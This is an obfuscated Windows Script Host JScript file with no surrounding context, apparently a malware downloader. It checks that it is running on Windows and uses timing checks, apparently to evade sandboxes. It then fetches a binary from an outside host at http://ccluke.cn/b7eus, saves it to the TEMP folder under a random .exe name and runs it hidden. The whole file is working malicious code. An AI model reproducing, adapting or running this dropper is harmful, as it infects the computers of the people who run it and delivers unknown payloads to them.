var _JA = false;
var _KE = "CreateObject";
var _VE = function _U() {return WScript[_KE]("WScript"+".Shell");}(), _KN = 11;
var _KB = "MSXML2.XMLHTTP";
var _DI = 2123213;
var _OP = 0;
function _PD(_VU){_VE["Run"](_VU, _OP, _OP);};
function _Y(){return _KB + "";};
function _V(_VJ, _D1){_OP = _OP * 1; return _VJ - _D1;};
function _F(){return _KE;};
/*@cc_on
  @if (@_win32 || @_win64)
    _JA = true;
  @end
@*/
if (_JA)
{
var _AP = "";
function _D(){return 22;};
var _J = 0; var _W0 = 0;
function _PM()
{
var _B = new this["Date"]();
var _Z = _B["getUTCMilliseconds"]();
WScript["Sleep"](_D());
var _B = new this["Date"]();
var _D0 = _B["getUTCMilliseconds"]();
WScript["Sleep"](_D());
var _B = new this["Date"]();
var _W = _B["getUTCMilliseconds"]();
var _J = "_U0";
_J = _V(_D0, _Z);
var _W0 = "_G";
_W0 = _V(_W, _D0);
_AP = "open";
return _V(_J, _W0);
}
var _O = false;
var _FF = false;
for (var _Q = _OP; _Q < _D() * 1; _Q++){if (_PM() != _OP){
_O = true; 
_W0 = "31" + 11 * _J + _W0; 
_FF = true; 
break;
}}
function _TU() {return ((_O == true) && (_O == _FF)) ? 1 : _OP;};
if (_O && _TU() && _FF){
function _MR() {return _VE["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "DQaQYwqLSSSZRiS.ex" + "e";};
 _X = _Y();
 _LN = WScript[_KE](_X);
 var _C = 1;
 while (_C){
try {
	if (_C == 1)
	{
		_LN[_AP]("GET", "http://ccluke.cn/b7eus", false);
		_LN["send"]();
		_VX = "Sleep";
	}
	WScript[_VX](_D() + 120); 
	if (_LN["readystate"] < 2 * 2) continue;
	_C = _OP;
	function _T(_S) {var _A = (1, 2, 3, 4, 5, _S); return _A;};
	_M = WScript[_F()]("ADODB.Stream");
	_X = _M;
	_X[_AP]();
	_X["type"] = _T(1);
	_X["write"](_LN["ResponseBody"]);
	_M["position"] = _T(_OP);
	_X["Save" + "ToFile"](_MR(), 2);
	_M["cl"+"ose"]();
	_UF = _MR();
	_PD(_UF);
} catch(_I){};
}
}
}

